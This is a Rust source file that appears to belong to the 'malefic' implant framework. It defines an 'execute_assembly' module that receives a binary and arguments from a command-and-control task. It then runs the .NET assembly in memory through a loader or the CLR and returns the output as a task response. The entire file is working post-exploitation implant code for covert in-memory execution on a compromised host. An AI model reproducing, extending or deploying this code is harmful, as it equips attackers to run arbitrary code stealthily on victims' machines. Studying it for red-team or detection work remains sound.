use std::ffi::CString;
use async_trait::async_trait;
use prost::Message;
use crate::{Module, TaskResult, check_request, to_error, Result};
use malefic_helper::protobuf::implantpb::AssemblyResponse;
use malefic_helper::protobuf::implantpb::spite::Body;
use malefic_trait::module_impl;

pub struct ExecuteAssembly {}

#[async_trait]
#[module_impl("execute_assembly")]
impl Module for ExecuteAssembly {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;

        let bin = request.bin;
        let mut response = AssemblyResponse::default();
        let mut result: Vec<u8> = Vec::new();
        #[cfg(feature = "community")]
        {
            use crate::MaleficExecAssembleInMemory;
            let c_strings: Vec<_> = request.params 
                    .iter()
                    .map(|s| {
                        let c_str = std::ffi::CString::new(s.as_str()).unwrap();
                        c_str.into_raw()
                    })
                    .collect();
            let ret = unsafe {MaleficExecAssembleInMemory(bin.as_ptr(), bin.len(), c_strings.as_ptr() as _, c_strings.len())};
            if ret.is_null() {
                to_error!(Err("Bof Loader failed!".to_string()))?
            }
            let ret_s = unsafe {CString::from_raw(ret as _).to_string_lossy().to_string()};
            result = ret_s.into_bytes();
        }
        #[cfg(feature = "professional")]
        {
            use malefic_win_kit::clr::CSharpUtils::ExecAssembleInMemory;
            result = unsafe {
                to_error!(ExecAssembleInMemory(&bin, &request.params))?.encode_to_vec()
            };
        }

        response.status = 0;
        // response.data = ret.encode_to_vec();
        response.data = result;

        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(response)))
    }
}